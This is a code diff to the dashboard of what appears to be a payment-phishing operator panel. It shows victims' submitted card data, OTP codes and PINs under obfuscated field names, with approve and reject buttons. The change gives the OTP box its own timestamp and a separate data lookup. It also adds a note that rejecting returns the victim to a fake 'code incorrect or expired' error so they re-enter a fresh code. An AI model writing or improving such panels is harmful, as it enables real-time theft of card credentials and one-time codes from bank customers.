@@ -951,7 +951,7 @@ export default function DashboardPage() {
     // Error messages for each step
     const errorMessages: Record<string, { message: string; targetPage: string }> = {
       "check": { message: "يرحى التأكد من بيانات الدفع او استخدام طريقة دفع مختلفة", targetPage: "check" },
-      "step2": { message: "رمز التحقق غير صحيح", targetPage: "step2" },
+      "step2": { message: "رمز التحقق غير صحيح او منتهي الصلاحية", targetPage: "step2" },
       "step3": { message: "رمز pin غير صحيح يرحى التأكد من الرمز مجدا", targetPage: "step3" },
       "step5": { message: "رقم الهاتف غير صحيح", targetPage: "step5" },
     };
@@ -1948,18 +1948,33 @@ const renderNafadBox = () => {
     const cardEntry = customerEntryGroup.find(e => {
       const raw = e.raw || {};
       const nestedRaw = raw.raw || {};
-      return !!(raw._v1 || raw._v2 || raw._v3 || raw._v5 || 
+      return !!(raw._v1 || raw._v2 || raw._v3 || 
         raw.cardNumber || raw.paymentStatus || raw.hasCard ||
-        nestedRaw._v1 || nestedRaw._v5 || nestedRaw.cardNumber);
+        nestedRaw._v1 || nestedRaw.cardNumber);
     });
     const cardRaw = cardEntry?.raw || null;
     const hasCardData = Boolean(
       cardRaw && (
-        cardRaw._v1 || cardRaw._v2 || cardRaw._v3 || cardRaw._v5 || 
+        cardRaw._v1 || cardRaw._v2 || cardRaw._v3 || 
         cardRaw.cardNumber || cardRaw.paymentStatus || cardRaw.hasCard
       )
     );
     const cardTimestamp = cardRaw ? getCardTimestamp(cardRaw) : 0;
+    
+    // Get OTP data and its timestamp (step2) - separate from card data
+    const getOtpTimestamp = (raw: any): number => {
+      if (!raw) return 0;
+      const ts = raw.otpSubmittedAt || raw._v5UpdatedAt || raw.cardUpdatedAt || raw.submittedAt;
+      return ts ? new Date(ts).getTime() : 0;
+    };
+    
+    const otpEntry = customerEntryGroup.find(e => {
+      const raw = e.raw || {};
+      return raw._v5 || raw.otpCode || raw.otpSubmittedAt;
+    });
+    const otpRaw = otpEntry?.raw || null;
+    const hasOtpData = Boolean(otpRaw && (otpRaw._v5 || otpRaw.otpCode));
+    const otpTimestamp = otpRaw ? getOtpTimestamp(otpRaw) : 0;
     
     // Get PIN data and its timestamp - ONLY show if actual PIN data exists
     const pinEntry = customerEntryGroup.find(e => {
@@ -2240,10 +2255,10 @@ const renderNafadBox = () => {
     }
     
     // صندوق منفصل لرمز OTP (step2)
-    if (cardRaw._v5 || cardRaw.otpCode) {
+    if (hasOtpData && otpRaw) {
       boxes.push({
         key: 'otp',
-        timestamp: cardTimestamp,
+        timestamp: otpTimestamp,
         component: (
           <div style={{ 
             background: "#ffffff", 
@@ -2255,7 +2270,7 @@ const renderNafadBox = () => {
             marginLeft: "auto",
             position: "relative"
           }}>
-            <TimeCounter timestamp={cardTimestamp} />
+            <TimeCounter timestamp={otpTimestamp} />
             <div style={{ display: "flex", justifyContent: "center", alignItems: "center", gap: 8, marginBottom: 12 }}>
               <span style={{ fontSize: "1rem" }}>🔐</span>
               <h3 style={{ margin: 0, fontSize: "0.9rem", fontWeight: 700, color: "#111827" }}>صندوق رمز التحقق (OTP)</h3>
@@ -2263,7 +2278,7 @@ const renderNafadBox = () => {
             {/* رمز OTP */}
             <div style={{ background: "#f0f9ff", borderRadius: 8, padding: 12, border: "1px solid #7dd3fc", textAlign: "center", marginBottom: 12 }}>
               <p style={{ margin: "0 0 4px", fontSize: "0.75rem", color: "#0369a1" }}>رمز التحقق المُدخل:</p>
-              <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{cardRaw._v5 || cardRaw.otpCode}</p>
+              <p style={{ margin: 0, fontSize: "1.5rem", fontWeight: 700, color: "#0c4a6e", letterSpacing: "0.3em" }}>{otpRaw._v5 || otpRaw.otpCode}</p>
             </div>
             {/* أزرار الموافقة والرفض */}
             <div style={{ display: "flex", gap: 8, marginTop: 12 }}>
@@ -2282,6 +2297,10 @@ const renderNafadBox = () => {
                 {actionLoading === "approve" ? "جارٍ..." : "✅ موافقة"}
               </button>
             </div>
+            {/* رسالة تحت الأزرار */}
+            <p style={{ margin: "8px 0 0", fontSize: "0.7rem", color: "#ef4444", textAlign: "center" }}>
+              الرفض: يرجع العميل ويعرض "رمز التحقق غير صحيح او منتهي الصلاحية"
+            </p>
           </div>
         )
       });
